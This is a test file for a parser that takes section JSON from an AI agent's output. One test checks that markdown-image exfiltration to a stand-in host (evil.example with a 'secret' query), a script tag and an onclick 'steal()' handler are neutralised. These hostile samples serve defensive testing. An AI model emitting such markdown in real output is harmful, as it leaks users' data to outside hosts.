import { describe, expect, test } from "bun:test";
import { AI_BLOCK_END, type Section } from "../src/note/markers.js";
import {
  extractLastFencedJson,
  parseSectionOutput,
  queryForSections,
  type AgentClient,
  type AgentQueryRequest,
  type AgentQueryResponse,
} from "../src/agent/contract.js";

const valid = [{ heading: "Summary", markdown: "Done" }];

describe("fenced JSON section contract", () => {
  test("extracts a fenced json block surrounded by prose", () => {
    expect(parseSectionOutput(`before\n\`\`\`json\n${JSON.stringify(valid)}\n\`\`\`\nafter`)).toEqual({ ok: true, sections: valid });
  });

  test("uses the last fenced json block when several are present", () => {
    const first = JSON.stringify([{ heading: "Old", markdown: "ignore" }]);
    const last = JSON.stringify(valid);
    const message = `\`\`\`json\n${first}\n\`\`\`\ntext\n\`\`\`json\n${last}\n\`\`\``;
    expect(extractLastFencedJson(message)?.trim()).toBe(last);
    expect(parseSectionOutput(message)).toEqual({ ok: true, sections: valid });
  });

  test("rejects output with no fenced json block", () => {
    expect(parseSectionOutput(JSON.stringify(valid))).toMatchObject({ ok: false, error: expect.stringContaining("No fenced") });
  });

  test("rejects malformed fenced json", () => {
    expect(parseSectionOutput("```json\n[{ nope }]\n```")).toMatchObject({ ok: false, error: expect.stringContaining("Malformed JSON") });
  });

  test("accepts markdown code fences and raw newlines inside a JSON string", () => {
    expect(parseSectionOutput('```json\n[{"heading":"API","markdown":"```ts\nfoo()\n```\ndone"}]\n```')).toEqual({
      ok: true,
      sections: [{ heading: "API", markdown: "```ts\nfoo()\n```\ndone" }],
    });
  });

  test("trims edge newlines before writer validation", () => {
    expect(parseSectionOutput('```json\n[{"heading":"Summary","markdown":"\\n- item\\n"}]\n```')).toEqual({
      ok: true,
      sections: [{ heading: "Summary", markdown: "- item" }],
    });
  });

  test("neutralizes external images and dangerous raw HTML", () => {
    const markdown = '![](https://evil.example/?d=secret)\n<img src="https://evil.example/x">\n<script>alert(1)</script>\n<div onclick="steal()">x</div>';
    const result = parseSectionOutput(`\`\`\`json\n${JSON.stringify([{ heading: "Summary", markdown }])}\n\`\`\``);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.sections[0]!.markdown).toContain("`![](https://evil.example/?d=secret)`");
      expect(result.sections[0]!.markdown).not.toContain("<img");
      expect(result.sections[0]!.markdown).not.toContain("<script");
      expect(result.sections[0]!.markdown).not.toContain("<div onclick=");
      expect(result.sections[0]!.markdown).toContain("&lt;img");
    }
  });

  test("rejects schema violations including empty arrays and headings", () => {
    expect(parseSectionOutput("```json\n[]\n```").ok).toBe(false);
    expect(parseSectionOutput('```json\n[{"heading":" ","markdown":3}]\n```').ok).toBe(false);
  });

  test("retries once then skips and preserves the last good sections", async () => {
    const agent = new SequenceAgent([
      { finalAssistantMessage: "not json", costUsd: 0.1 },
      { finalAssistantMessage: "still not json", costUsd: 0.2 },
    ]);
    const lastGood: readonly Section[] = [{ heading: "Existing", markdown: "Keep me" }];
    const errors: string[] = [];
    const result = await queryForSections(agent, request(), lastGood, { error: (message) => errors.push(String(message)) });
    expect(agent.requests).toHaveLength(2);
    expect(agent.requests[1]?.prompt).toContain("Validation error");
    expect(result).toEqual(expect.objectContaining({ status: "skipped", sections: lastGood, attempts: 2 }));
    expect(result.costUsd).toBeCloseTo(0.3);
    expect(errors[0]).toContain("OUTPUT REJECTED AFTER TWO ATTEMPTS");
  });

  test("rejects marker tokens in model output", () => {
    const message = `\`\`\`json\n${JSON.stringify([{ heading: "Summary", markdown: AI_BLOCK_END }])}\n\`\`\``;
    expect(parseSectionOutput(message)).toMatchObject({ ok: false, error: expect.stringContaining("ownership marker") });
  });
});

class SequenceAgent implements AgentClient {
  readonly requests: AgentQueryRequest[] = [];
  readonly #responses: AgentQueryResponse[];

  constructor(responses: AgentQueryResponse[]) {
    this.#responses = responses;
  }

  async query(requestValue: AgentQueryRequest): Promise<AgentQueryResponse> {
    this.requests.push(requestValue);
    const response = this.#responses.shift();
    if (response === undefined) throw new Error("No fake response configured.");
    return response;
  }
}

function request(): AgentQueryRequest {
  return {
    prompt: "enhance",
    systemPrompt: "contract",
    cwd: process.cwd(),
    tools: [],
    settingSources: [],
    maxTurns: 2,
  };
}
